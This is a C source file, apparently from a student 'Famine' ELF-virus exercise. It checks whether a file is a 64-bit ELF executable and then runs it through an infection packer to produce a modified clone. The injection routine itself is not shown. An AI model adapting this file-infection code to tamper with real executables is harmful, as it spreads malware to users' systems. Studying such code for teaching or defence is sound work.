/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 02:26:10 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <linux/elf.h>
#include "infect.h"
#include "syscall.h"
#include "accessors.h"
#include "errors.h"

static bool	elf64_identifier(const Elf64_Ehdr *hdr, \
			struct endians_pointer *endians)
{
	if (memcmp(hdr->e_ident, ELFMAG, SELFMAG) != 0 // wrong Magic
	|| hdr->e_ident[EI_CLASS] != ELFCLASS64        // not 64bit
	|| hdr->e_entry == 0                           // no entry point
	|| hdr->e_phoff == 0                           // no program hdr table
	|| hdr->e_shoff == 0)                          // no section hdr table
		return false;

	// set endian for the future
	set_endian(endians, hdr->e_ident[EI_DATA] == ELFDATA2MSB);

	return true;
}

inline bool	infect_if_candidate(const char *file)
{
	struct famine	food;
	Elf64_Ehdr	elf64_hdr;
	int		fd = famine_open(file, O_RDONLY);

	if (fd < 0
	|| famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr)
	|| elf64_identifier(&elf64_hdr, &food.endians) == false)
	{
		famine_close(fd);
		return errors(ERR_USAGE, "not elf64 executable");
	}
	famine_close(fd);

	food.original_safe = original_accessor(file);
	if (food.original_safe.ptr == NULL) return errors(ERR_THROW, "infect_if_candidate");

	food.clone_safe = clone_accessor(food.original_safe.filesize);
	if (food.clone_safe.ptr == NULL) return errors(ERR_THROW, "infect_if_candidate");

	if (elf64_packer(food, food.original_safe.filesize))
		return errors(ERR_THROW, "infect_if_candidate");

	write_clone_file(food.clone_safe, "tutufile");

	free_accessor(food.original_safe);
	free_accessor(food.clone_safe);

	return true;
}
